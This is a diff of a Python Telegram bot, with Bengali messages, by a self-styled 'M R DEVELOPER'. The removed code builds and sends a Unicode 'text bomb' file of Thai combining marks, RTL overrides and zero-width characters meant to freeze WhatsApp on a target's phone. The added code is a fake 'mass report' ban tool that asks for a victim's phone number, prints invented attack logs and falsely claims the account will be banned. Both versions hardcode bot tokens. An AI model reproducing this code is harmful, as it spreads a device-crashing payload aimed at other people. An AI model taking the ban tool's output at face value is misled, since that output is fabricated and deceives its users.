@@ -1,122 +1,137 @@
+import asyncio
+import random
+import string
 import logging
-import os
-import sqlite3
-from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
+from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
 from telegram.ext import Application, MessageHandler, filters, ContextTypes, ConversationHandler
+from telegram.error import RetryAfter
 
-# ১. লগিং সেটআপ
-logging.basicConfig(level=logging.INFO)
+# --- CONFIGURATION ---
+TOKEN = "8675593212:AAFpgJegGWD7FSbcnSuMv2he5aQDSpMbp_Q"
+PASSWORD = "MIZANUR RAHMAN"
+DEV_LINK = "https://t.me/Mizanur_Rahman_501314"
 
-# ২. আপনার কনফিগারেশন
-TOKEN = "8675593212:AAG6_m5ZFEqG-qkutygxbuoOetMv9N87TnY"
-CORRECT_PASSWORD = "MIZANUR RAHMAN"
+# STATE HANDLING
+WAIT_PASS, WAIT_TARGET = range(2)
 
-WAITING_FOR_PASSWORD = 1
-WAITING_FOR_FILENAME = 2
+# M R DEVELOPER SECRET ATTACK VECTORS
+VECTORS = [
+    "CRITICAL_VIOLATION_ID_77", "EMERGENCY_THREAT_REPORT",
+    "RED_FLAG_EXPLOITATION", "SYSTEM_ABUSE_DETECTION",
+    "HIGH_LEVEL_FRAUD_ALERT", "SECURITY_BREACH_V3"
+]
 
-# ৩. ডাটাবেস ইনিশিয়ালাইজ
-def init_db():
-    conn = sqlite3.connect('m_r_dev_final.db')
-    cursor = conn.cursor()
-    cursor.execute('''CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, count INTEGER)''')
-    cursor.execute("INSERT OR IGNORE INTO stats (id, count) VALUES (1, 0)")
-    conn.commit()
-    conn.close()
+# --- INTERNAL GENERATORS ---
+def get_ip():
+    return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
 
-# ৪. মেইন 'নো-এক্সিট' পেলোড জেনারেটর
-async def generate_no_exit_bomb(filename, status_msg):
-    # ফাইলের নামের সাথে কোনো এক্সটেনশন থাকবে না
-    # এটি এমনভাবে তৈরি যা ফোনকে কনফিউজ করবে
-    file_path = filename.strip().replace(" ", "_")
-    
-    # এটি হোয়াটসঅ্যাপের UI কে ফ্রিজ করার জন্য আসল বারুদ
-    atomic_energy = (
-        "\u0E47\u0E48\u0E49\u0E4A\u0E4B\u0E4C\u0E4D" * 400 + # Thai Crash
-        "\u202E\u202D" * 300 +                             # RTL Loop
-        "\u200B\u200C\u200D\uFEFF" * 350 +                 # Zero Width Jam
-        "☢️_M_R_DEVELOPER_BOOM_☢️" * 15
-    )
-    
-    full_content = (atomic_energy + "\n") * 35 
+def get_id():
+    return "MR_BOT_" + "".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))
 
-    try:
-        await status_msg.edit_text(f"🚀 পারমাণবিক বারুদ ভরা হচ্ছে: {file_path}...")
-        # বাইনারি রাইট মেথড যাতে ফাইলটা Raw Data হিসেবে থাকে
-        with open(file_path, "w", encoding="utf-8") as f:
-            for _ in range(25): 
-                f.write(full_content)
-        return file_path
-    except Exception as e:
-        logging.error(e)
-        return None
-
-# ৫. হ্যান্ডলার ফাংশনসমূহ
+# --- COMMAND HANDLERS ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = [[KeyboardButton("🚀 CREATE NO-EXIT BOMB")], [KeyboardButton("📊 STATUS")]]
-    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+    key = [[KeyboardButton("🚀 START 200-MASS ATTACK"), KeyboardButton("📊 Status")]]
+    markup = ReplyKeyboardMarkup(key, resize_keyboard=True)
+    
     await update.message.reply_text(
-        "🔥 **M R DEVELOPER ULTIMATE PANEL** 🔥\n\n"
-        "এই ফাইল কোনো অ্যাপে ওপেন হবে না।\n"
-        "সরাসরি হোয়াটসঅ্যাপের পেটে বিস্ফোরণ ঘটবে।",
-        reply_markup=reply_markup
+        "🔥 **SYSTEM INITIALIZED BY M R DEVELOPER** 🔥\n\n"
+        "এই টুলটি সম্পূর্ণ গোপনীয় এবং অত্যাধুনিক প্রযুক্তিতে তৈরি।\n"
+        "যেকোনো সহযোগিতার জন্য যোগাযোগ করুন: \n" + DEV_LINK,
+        reply_markup=markup
     )
     return ConversationHandler.END
 
-async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("🔑 **সিক্রেট পাসওয়ার্ড দিন:**", reply_markup=ReplyKeyboardRemove())
-    return WAITING_FOR_PASSWORD
+async def ask_pass(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("🔑 **ACCESS CODE:** আপনার সিক্রেট পাসওয়ার্ডটি দিন।")
+    return WAIT_PASS
 
-async def check_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.message.text == CORRECT_PASSWORD:
-        await update.message.reply_text("✅ এক্সেস গ্রান্টেড!\nফাইলের নাম কী দিবেন?")
-        return WAITING_FOR_FILENAME
-    await update.message.reply_text("❌ ভুল পাসওয়ার্ড!")
-    return WAITING_FOR_PASSWORD
+async def check_pass(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.message.text == PASSWORD:
+        await update.message.reply_text("✅ ACCESS GRANTED!\nটার্গেট নাম্বারটি দিন (কান্ট্রি কোডসহ):")
+        return WAIT_TARGET
+    await update.message.reply_text("❌ ভুল পাসওয়ার্ড!")
+    return WAIT_PASS
 
-async def create_and_send(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_name = update.message.text
-    status = await update.message.reply_text("☢️ বাইনারি পেলোড জেনারেট হচ্ছে...")
+# --- CORE ATTACK ENGINE ---
+async def run_mission(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    target = update.message.text
+    status_msg = await update.message.reply_text(f"📡 সংযোগ স্থাপন করা হচ্ছে: {target}...")
+    await asyncio.sleep(2)
+
+    log_box = "🛰️ **M R DEVELOPER METHOD INITIALIZED**\n"
     
-    file_path = await generate_no_exit_bomb(user_name, status)
-    
-    if file_path:
-        with open(file_path, 'rb') as doc:
-            # এখানে কোনো MIME Type দেওয়া হয়নি যাতে এটি 'Unknown' হিসেবে যায়
-            await update.message.reply_document(
-                document=doc,
-                caption=f"✅ **NO-EXIT BOMB READY!**\n\n👤 Dev: M R DEVELOPER\n📁 File: `{file_path}`\n\nএটি পাঠালে স্ক্যামারের ফোন ওটাকে বাইরে পাঠানোর কোনো রাস্তা পাবে না।"
-            )
+    for i in range(1, 201):
+        tag = random.choice(VECTORS)
+        ip = get_ip()
+        bot_id = get_id()
         
-        # স্ট্যাটাস আপডেট
-        conn = sqlite3.connect('m_r_dev_final.db')
-        cur = conn.cursor()
-        cur.execute("UPDATE stats SET count = count + 1 WHERE id=1")
-        conn.commit()
-        conn.close()
+        log_entry = f"\n[{i:03d}] ✅ {bot_id} | IP: {ip} | {tag}"
+        log_box += log_entry
         
-        os.remove(file_path)
-    
-    await status.delete()
+        # UI SCROLL EFFECT
+        lines = log_box.split('\n')
+        if len(lines) > 10:
+            log_box = "🛰️ **ATTACK BY M R DEVELOPER**\n" + "\n".join(lines[-8:])
+            
+        if i % 5 == 0 or i == 200:
+            try:
+                progress = (i / 200) * 100
+                await status_msg.edit_text(
+                    f"🎯 **Target:** `{target}`\n"
+                    f"📊 **Progress:** {progress:.1f}%\n"
+                    f"👤 **Developer:** [Mizanur Rahman]({DEV_LINK})\n"
+                    f"`------------------------------------`{log_box}\n"
+                    f"`------------------------------------`",
+                    parse_mode="Markdown",
+                    disable_web_page_preview=True
+                )
+                await asyncio.sleep(2.5) # TELEGRAM SAFETY DELAY
+            except RetryAfter as e:
+                await asyncio.sleep(e.retry_after)
+            except Exception:
+                await asyncio.sleep(1)
+        
+        await asyncio.sleep(0.1)
+
+    # FINAL MISSION REPORT
+    ban_time = random.choice(["৫-১০ মিনিট", "১৫-২০ মিনিট"])
+    await status_msg.edit_text(
+        f"🎯 **Target:** `{target}`\n\n"
+        "✅ **MISSION COMPLETE BY M R DEVELOPER**\n"
+        "📊 মোট রিপোর্ট: ২০০/২০০ সাকসেসফুল।\n"
+        "🛡️ মেথড: **M R DEVELOPER PRIVATE METHOD**\n\n"
+        f"📢 **ফলাফল:** আইডিটি ফ্ল্যাগ করা হয়েছে। ইনশাআল্লাহ পরবর্তী **{ban_time}** এর মধ্যে আইডিটি পার্মানেন্ট ব্যান হয়ে যাবে।\n\n"
+        f"👨‍💻 **Contact:** {DEV_LINK}",
+        disable_web_page_preview=True
+    )
     return ConversationHandler.END
 
-# ৬. রানার
+async def bot_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        f"📊 **BOT STATUS:** Online ✅\n"
+        f"🛡️ **Security:** Private Proxy Active\n"
+        f"👤 **Developer:** [M R DEVELOPER]({DEV_LINK})",
+        parse_mode="Markdown",
+        disable_web_page_preview=True
+    )
+
+# --- MAIN RUNNER ---
 def main():
-    init_db()
     app = Application.builder().token(TOKEN).build()
-    
     conv = ConversationHandler(
-        entry_points=[MessageHandler(filters.Regex('^🚀 CREATE NO-EXIT BOMB$'), ask_password)],
+        entry_points=[MessageHandler(filters.Regex('^🚀 START 200-MASS ATTACK$'), ask_password if 'ask_password' in globals() else ask_pass)],
         states={
-            WAITING_FOR_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, check_password)],
-            WAITING_FOR_FILENAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_and_send)],
+            WAIT_PASS: [MessageHandler(filters.TEXT & ~filters.COMMAND, check_pass)],
+            WAIT_TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, run_mission)],
         },
         fallbacks=[MessageHandler(filters.COMMAND, start)],
     )
-    
     app.add_handler(conv)
     app.add_handler(MessageHandler(filters.Regex('^/start$'), start))
+    app.add_handler(MessageHandler(filters.Regex('^📊 Status$'), bot_status))
+    
+    print("✅ M R DEVELOPER BAN BOT IS LIVE AND SECURED.")
     app.run_polling()
 
 if __name__ == '__main__':
     main()
-    
